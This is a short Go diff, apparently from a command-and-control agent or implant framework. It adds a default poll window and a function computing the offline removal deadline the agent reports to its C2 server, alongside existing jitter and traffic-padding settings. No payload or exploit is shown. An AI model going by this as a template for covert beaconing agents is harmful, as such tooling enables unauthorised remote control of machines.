@@ -36,6 +36,9 @@ func InitConfig() (err error) {
 	if RuntimeConfig.Jitter == 0 {
 		RuntimeConfig.Jitter = 20
 	}
+	if RuntimeConfig.PollWindow == 0 {
+		RuntimeConfig.PollWindow = 5
+	}
 
 	// Control-frame padding is a sender-side knob; 0 disables it.
 	transport.SetC2Padding(RuntimeConfig.PaddingMin, RuntimeConfig.PaddingMax)
@@ -100,4 +103,21 @@ func InitConfig() (err error) {
 	transport.SetCACrtPEM([]byte(RuntimeConfig.CAPEM))
 
 	return err
+}
+
+// OfflineGraceSeconds returns the removal deadline this agent reports to the
+// C2. The agent owns the policy; the C2 only honours the value.
+func OfflineGraceSeconds() int {
+	if RuntimeConfig.OfflineGrace > 0 {
+		return RuntimeConfig.OfflineGrace
+	}
+	interval := RuntimeConfig.PollInterval
+	if interval <= 0 {
+		interval = 60
+	}
+	window := RuntimeConfig.PollWindow
+	if window <= 0 {
+		window = 5
+	}
+	return interval + window + interval/2
 }
